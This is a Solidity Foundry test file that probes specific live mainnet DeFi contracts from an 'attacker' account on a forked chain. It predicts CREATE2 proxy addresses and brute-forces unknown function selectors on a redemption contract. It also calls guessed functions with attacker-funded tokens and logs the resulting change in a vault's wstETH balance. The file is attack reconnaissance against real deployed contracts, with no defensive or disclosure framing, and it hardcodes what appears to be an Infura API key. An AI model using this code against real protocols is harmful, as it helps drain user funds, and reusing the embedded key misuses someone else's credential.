// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract PredictProxyAddress is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    // Init code hash found in bytecode
    bytes32 constant INIT_CODE_HASH = 0xa7afdc89189c0997287e337d2577f5aa7f1fa2faecf74ac9e05b6fdc306bfcd6;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_PredictProxyForAttacker() public view {
        console.log("=== PREDICTING PROXY ADDRESS FOR ATTACKER ===\n");

        console.log("Deployer (R1):", REDEMPTION_1);
        console.log("Init code hash:");
        console.logBytes32(INIT_CODE_HASH);
        console.log("Attacker:", attacker);

        // If salt = CALLER:
        bytes32 salt = bytes32(uint256(uint160(attacker)));
        console.log("\nSalt (CALLER):");
        console.logBytes32(salt);

        address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_1,
            salt,
            INIT_CODE_HASH
        )))));

        console.log("Predicted proxy for attacker:", predicted);
        console.log("Code at predicted:", predicted.code.length);

        // Check if this address is registered in RC
        bytes32 key = keccak256(abi.encode(predicted, uint256(4)));
        bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);
        console.log("Registered in RC:");
        console.logBytes32(val);

        // Try other salt patterns
        console.log("\n--- Other salt patterns ---");

        // Pattern: keccak256(attacker)
        bytes32 salt2 = keccak256(abi.encode(attacker));
        address predicted2 = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_1,
            salt2,
            INIT_CODE_HASH
        )))));
        console.log("Salt = keccak256(attacker):", predicted2);

        // Pattern: keccak256(attacker, 0)
        bytes32 salt3 = keccak256(abi.encode(attacker, uint256(0)));
        address predicted3 = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_1,
            salt3,
            INIT_CODE_HASH
        )))));
        console.log("Salt = keccak256(attacker,0):", predicted3);
    }

    function test_CheckExistingProxies() public view {
        console.log("=== CHECKING EXISTING PROXIES ===\n");

        // Check if any proxies have been created for known addresses
        // Try the owner of R1

        bytes32 slot0 = vm.load(REDEMPTION_1, bytes32(0));
        address r1Owner = address(uint160(uint256(slot0)));
        console.log("R1 owner:", r1Owner);

        bytes32 ownerSalt = bytes32(uint256(uint160(r1Owner)));
        address ownerProxy = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_1,
            ownerSalt,
            INIT_CODE_HASH
        )))));

        console.log("Predicted proxy for R1 owner:", ownerProxy);
        console.log("Code size:", ownerProxy.code.length);

        // Check more addresses
        address[] memory toCheck = new address[](5);
        toCheck[0] = REDEMPTION_0;
        toCheck[1] = REDEMPTION_CONTROLLER;
        toCheck[2] = VAULT;
        toCheck[3] = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70; // Treasury
        toCheck[4] = 0x434B68B11bBE8FD3074089397cA3d275801d6354; // Implementation

        console.log("\nChecking other addresses:");
        for (uint i = 0; i < toCheck.length; i++) {
            bytes32 salt = bytes32(uint256(uint160(toCheck[i])));
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff),
                REDEMPTION_1,
                salt,
                INIT_CODE_HASH
            )))));
            if (predicted.code.length > 0) {
                console.log("Address", i, "has proxy at:", predicted);
            }
        }
    }

    function test_FindSelectorForCreate2() public {
        console.log("=== FINDING SELECTOR THAT TRIGGERS CREATE2 ===\n");

        // Try all selectors found in R1 and see which one creates a new contract
        bytes4[] memory sels = new bytes4[](18);
        sels[0] = bytes4(0x578063ed);
        sels[1] = bytes4(0xeda72134);
        sels[2] = bytes4(0xf2fde38b);
        sels[3] = bytes4(0xfd424ea8);
        sels[4] = bytes4(0xc5d664c6);
        sels[5] = bytes4(0xcff50c6e);
        sels[6] = bytes4(0xe30c3978);
        sels[7] = bytes4(0x8da5cb5b);
        sels[8] = bytes4(0x9307e802);
        sels[9] = bytes4(0xb2118a8d);
        sels[10] = bytes4(0x715018a6);
        sels[11] = bytes4(0x778d364f);
        sels[12] = bytes4(0x79ba5097);
        sels[13] = bytes4(0x51cbf345);
        sels[14] = bytes4(0x5c975abb);
        sels[15] = bytes4(0x61d027b3);
        sels[16] = bytes4(0x411557d1);
        sels[17] = bytes4(0x42dbe168);

        vm.startPrank(attacker);

        console.log("Testing selectors:");
        for (uint i = 0; i < sels.length; i++) {
            // Calculate predicted address before call
            bytes32 salt = bytes32(uint256(uint160(attacker)));
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff),
                REDEMPTION_1,
                salt,
                INIT_CODE_HASH
            )))));

            uint256 codeBefore = predicted.code.length;

            // Try calling with no params
            (bool s1,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i])
            );

            // Try with address param
            (bool s2,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], attacker)
            );

            // Try with uint param
            (bool s3,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], uint256(100e18))
            );

            uint256 codeAfter = predicted.code.length;

            if (codeAfter > codeBefore) {
                console.log("CREATED PROXY!");
                console.logBytes4(sels[i]);
            }

            if (s1 || s2 || s3) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();
    }

    function test_MatchSelectorsToNames() public pure {
        console.log("=== MATCHING SELECTORS TO FUNCTION NAMES ===\n");

        // Known selectors in R1
        bytes4[] memory sels = new bytes4[](18);
        sels[0] = bytes4(0x578063ed);
        sels[1] = bytes4(0xeda72134);
        sels[2] = bytes4(0xf2fde38b);
        sels[3] = bytes4(0xfd424ea8);
        sels[4] = bytes4(0xc5d664c6);
        sels[5] = bytes4(0xcff50c6e);
        sels[6] = bytes4(0xe30c3978);
        sels[7] = bytes4(0x8da5cb5b);
        sels[8] = bytes4(0x9307e802);
        sels[9] = bytes4(0xb2118a8d);
        sels[10] = bytes4(0x715018a6);
        sels[11] = bytes4(0x778d364f);
        sels[12] = bytes4(0x79ba5097);
        sels[13] = bytes4(0x51cbf345);
        sels[14] = bytes4(0x5c975abb);
        sels[15] = bytes4(0x61d027b3);
        sels[16] = bytes4(0x411557d1);
        sels[17] = bytes4(0x42dbe168);

        // Common function names
        string[50] memory funcs = [
            "owner()",
            "pendingOwner()",
            "transferOwnership(address)",
            "acceptOwnership()",
            "renounceOwnership()",
            "paused()",
            "pause()",
            "unpause()",
            "treasury()",
            "setTreasury(address)",
            "vault()",
            "setVault(address)",
            "asset()",
            "setAsset(address)",
            "redeem(uint96)",
            "redeem(uint256)",
            "finalizeRedeem(uint256)",
            "claimRewards()",
            "claimRewards(address)",
            "getRewards()",
            "collectRewards()",
            "initialize(address)",
            "initialize()",
            "implementation()",
            "setImplementation(address)",
            "upgradeTo(address)",
            "claim()",
            "claim(address)",
            "withdraw(uint256)",
            "withdraw(uint256,address)",
            "deposit(uint256)",
            "deposit(uint256,address)",
            "redeemController()",
            "setRedeemController(address)",
            "fee()",
            "setFee(uint256)",
            "feeRecipient()",
            "setFeeRecipient(address)",
            "createProxy()",
            "createProxy(address)",
            "deployProxy()",
            "getProxy(address)",
            "proxyFor(address)",
            "execute(address,bytes)",
            "multicall(bytes[])",
            "rescue(address)",
            "sweep(address)",
            "emergencyWithdraw()",
            "emergencyWithdraw(address)",
            "recoverTokens(address,uint256)"
        ];

        for (uint s = 0; s < 18; s++) {
            console.log("\nSelector:");
            console.logBytes4(sels[s]);

            for (uint f = 0; f < 50; f++) {
                bytes4 computed = bytes4(keccak256(bytes(funcs[f])));
                if (computed == sels[s]) {
                    console.log("MATCH:", funcs[f]);
                }
            }
        }
    }

    function test_TryClaimProxy() public {
        console.log("=== TRYING TO CLAIM/CREATE PROXY ===\n");

        // First let's try the functions that might create a proxy

        deal(TASSET, attacker, 100000e18);
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_1, type(uint256).max);

        // Calculate predicted proxy
        bytes32 salt = bytes32(uint256(uint160(attacker)));
        address predictedProxy = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_1,
            salt,
            INIT_CODE_HASH
        )))));

        console.log("Predicted proxy:", predictedProxy);
        console.log("Proxy code before:", predictedProxy.code.length);

        // Try to trigger proxy creation
        console.log("\nTrying potential proxy creation functions:");

        // 0x42dbe168 - might be createProxy or claimProxy
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x42dbe168))
        );
        console.log("0x42dbe168():", s1);
        if (s1 && d1.length >= 32) {
            address result = abi.decode(d1, (address));
            console.log("  Returned:", result);
        }

        // 0x778d364f
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x778d364f), attacker)
        );
        console.log("0x778d364f(attacker):", s2);
        if (s2 && d2.length >= 32) {
            address result = abi.decode(d2, (address));
            console.log("  Returned:", result);
        }

        // 0x411557d1
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x411557d1), attacker)
        );
        console.log("0x411557d1(attacker):", s3);
        if (s3 && d3.length >= 32) {
            address result = abi.decode(d3, (address));
            console.log("  Returned:", result);
        }

        // 0x51cbf345
        (bool s4, bytes memory d4) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x51cbf345), attacker)
        );
        console.log("0x51cbf345(attacker):", s4);
        if (s4 && d4.length >= 32) {
            address result = abi.decode(d4, (address));
            console.log("  Returned:", result);
        }

        vm.stopPrank();

        console.log("\nProxy code after:", predictedProxy.code.length);

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
    }
}
